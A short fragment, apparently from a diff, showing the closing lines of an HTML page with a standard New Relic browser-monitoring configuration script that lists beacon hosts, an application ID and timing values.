+<script type="text/javascript">window.NREUM||(NREUM={});NREUM.info={"beacon":"bam.nr-data.net","licenseKey":"e5b1bb6526","applicationID":"25687702","transactionName":"ZldWNUZXWkIEAUcKXF8ddQJAX1tfSgFeEBxYXFAETBldXwEHSw==","queueTime":0,"applicationTime":1947,"atts":"ShBVQw5NSUw=","errorBeacon":"bam.nr-data.net","agent":""}</script></body>
+</html>
